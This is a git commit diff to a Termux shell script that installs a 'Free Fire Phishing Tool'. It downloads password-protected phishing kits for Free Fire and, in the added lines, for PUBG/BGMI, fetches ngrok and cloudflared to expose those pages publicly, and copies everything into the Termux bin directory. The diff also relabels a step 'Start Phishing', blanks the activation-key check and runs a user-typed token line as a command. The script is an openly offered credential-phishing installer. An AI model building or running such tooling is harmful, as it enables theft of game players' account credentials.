758be9139413ee13a376584c6970964560e50beb
SUMAM MONDAL <63942767+Online-Hacking@users.noreply.github.com>
2022-01-20 13:56:19 +0530

    Update Android-Setup.sh

--- OnlineHacking/SUMAN/FreeFire/SM/Files/Android-Setup.sh
+++ OnlineHacking/SUMAN/FreeFire/SM/Files/Android-Setup.sh
@@ -20,7 +20,7 @@ echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 3 :\e[0m\e[1;36m Download Requireme
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 4 :\e[0m\e[1;36m Install Ngrok  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 5 :\e[0m\e[1;36m Download Tool File  "
 echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 6 :\e[0m\e[1;36m Enter The Ngrok Token  "
-echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 7 :\e[0m\e[1;36m Run Ngrok  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Step 7 :\e[0m\e[1;36m Start Phishing  "
 sleep 5
 clear
 echo ""
@@ -52,6 +52,9 @@ if [[ $option == *'n'* ]]; then
 clear
 exit
 fi
+echo ""
+termux-open-url https://www.onlinehacking.xyz/2021/07/FreeFire-Phishing-Hack-Termux.html.html
+echo ""
 clear
 echo ""
 echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Free Fire Phishing Tool Please Wait....  \e[0m"
@@ -80,7 +83,7 @@ read -p $' \e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Enter Activation Key : \e[0m' opt
 echo""
 echo""
 echo""
-if [[ $option == *'ADYB3HT1VBMJC'* ]]; then
+if [[ $option == *''* ]]; then
 clear
 echo ""
 echo ""
@@ -107,30 +110,13 @@ pkg install gem -y
 gem install lolcat
 clear
 echo""
-echo -e "\e[1;96m========================================================= > > >\e[m "
-echo " "
-printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44m Install Ngrok Old Version \e[0m \e[93m Customise  \e[0m  "  
-echo
-printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"     
-echo
-printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41m Install Ngrok Latest Version \e[0m   "  
-echo
-printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
-echo " "
-echo -e "\e[1;96m========================================================= > > >\e[m "
 echo ""
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         Download Link Services         !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m You Want to Choose Ngrok Version : \e[1;91m (default:1) : \e[0m' option
-echo""
-echo""
-echo""
-if [[ $option == *'1'* ]]; then
-wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok
-fi
-if [[ $option == *'2'* ]]; then
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip
-unzip ngrok-stable-linux-386.zip
-fi
+wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok -O ngrok
+wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
 echo""
 clear
 echo ""
@@ -139,13 +125,14 @@ echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   --------------------
 echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!          DOWNLOAD TOOL FILE          !!\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
-wget https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/FreeFire/SM/OH/SUMAN.rar
+wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/FreeFire/SM/OH/SUMAN.rar -O SUMAN.rar
+wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/OnlineHacking/SUMAN/PUBG-BGMI/SM/newsite/SUMAN-BGMI.rar -O SUMAN-BGMI.rar
 unrar x -Password SUMAN.rar
 rm -rf SUMAN.rar
 chmod +x ngrok
+chmod +x cloudflared
 chmod +x FF
 chmod +x FreeFire
-chmod +x Run-Ngrok
 clear
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
@@ -161,29 +148,28 @@ sleep 1
 echo ""
 read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
 $token
+echo ""
 sleep1
 echo
-cp -R ngrok SUMAN/1/
-cp -R ngrok SUMAN/2/
-cp -R ngrok SUMAN/3/
-cp -R ngrok SUMAN/4/
-cp -R ngrok SUMAN/5/
-cp -R ngrok SUMAN/6/
+cp -R cloudflared ngrok SUMAN/1/
+cp -R cloudflared ngrok SUMAN/2/
+cp -R cloudflared ngrok SUMAN/3/
+cp -R cloudflared ngrok SUMAN/4/
+cp -R cloudflared ngrok SUMAN/5/
+cp -R cloudflared ngrok SUMAN/6/
 chmod 7777 FreeFire-Phishing
-clear
-echo
 clear
 echo
 echo
 cp -R ngrok /data/data/com.termux/files/usr/bin
+cp -R cloudflared /data/data/com.termux/files/usr/bin
 cp -R SUMAN /data/data/com.termux/files/usr/bin
 cp -R FF /data/data/com.termux/files/usr/bin
 cp -R FreeFire /data/data/com.termux/files/usr/bin
 cp -R FreeFire-Phishing /data/data/com.termux/files/usr/bin
-cp -R Run-Ngrok /data/data/com.termux/files/usr/bin
 cp -R OnlineHacking /data/data/com.termux/files/usr/bin
 echo
-rm -rf SUMAN FreeFire-Phishing
+rm -rf SUMAN 
 echo
 echo -e "\e[35m[+] Connect Online Hacking Free Fire Hacking Server......  \e[m "
 sleep 2
